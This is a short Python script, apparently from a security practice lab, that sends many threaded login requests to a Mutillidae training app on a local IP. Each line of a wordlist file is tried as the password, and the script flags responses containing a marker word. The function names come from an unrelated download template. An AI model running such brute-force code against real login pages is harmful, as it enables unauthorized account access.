import requests
from requests.sessions import Session
import time
import re
from concurrent.futures import ThreadPoolExecutor
from threading import Thread,local

dirs = []
	
dirs_raw = open('dir_list2.txt', 'r', encoding='latin-1').readlines()
for i in dirs_raw:
	thisDir = i.strip()
	print(thisDir)
	if len(thisDir) == 0:
		continue
	dirs.append(thisDir)
url_list = ["https://www.google.com/","https://www.bing.com"]*50
thread_local = local()

def get_session() -> Session:
    if not hasattr(thread_local,'session'):
        thread_local.session = requests.Session()
    return thread_local.session

def download_link(url:str):
    session = get_session()
    with session.post('http://192.168.43.38/mutillidae/index.php?page=login.php', data={'username':'sdsd','password':url,'login-php-submit-button':'Login'}) as response:
        print(f'Read {len(response.content)}')
        #pattern.fullmatch("admin") 
        pattern = re.compile('Deliberately')
        match = re.search(pattern, str(response.text))
        if match:
            print("gotin")

def download_all(urls:list) -> None:
    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(download_link,dirs)

start = time.time()
download_all(dirs)
end = time.time()
print(f'download {len(dirs)} links in {end - start} seconds')